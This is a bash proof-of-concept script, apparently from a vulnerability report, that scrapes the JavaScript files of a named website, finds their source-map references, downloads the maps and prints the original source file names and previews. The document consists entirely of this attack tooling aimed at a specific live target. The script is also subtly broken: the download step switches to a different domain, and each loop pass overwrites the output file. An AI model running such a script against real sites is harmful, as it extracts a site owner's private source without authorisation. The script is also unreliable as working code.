#!/bin/bash
# Source Map Exposure PoC

echo "[*] Extracting source maps from JavaScript files..."

# Get main JavaScript files
js_files=$(curl -s https://stockity.com/ | grep -o 'src="[^"]*\.js"' | sed 's/src="//;s/"//')

for js in $js_files; do
    echo "[*] Checking $js for source map"
    
    # Check for source map comment
    source_map=$(curl -s "https://stockity.com/$js" | grep -o "//# sourceMappingURL=[^ ]*" | cut -d= -f2)
    
    if [ -n "$source_map" ]; then
        echo "[✓] Source map found: $source_map"
        
        # Download source map
        curl -s "https://stockify.com/$source_map" -o "$(basename $source_map)"
        
        # Extract original source
        if [ -f "$(basename $source_map)" ]; then
            echo "[*] Extracting original source from source map..."
            
            # Parse source map (simplified)
            cat "$(basename $source_map)" | python3 -c "
import json, sys
data = json.load(sys.stdin)
print(f'Version: {data.get(\"version\")}')
print(f'File: {data.get(\"file\")}')
print(f'Sources: {len(data.get(\"sources\", []))}')
for i, src in enumerate(data.get('sources', [])[:5]):
    print(f'  Source {i}: {src}')
    if i < len(data.get('sourcesContent', [])):
        print(f'    Preview: {data[\"sourcesContent\"][i][:200]}...')
" > source-extract.txt
        fi
    fi
done
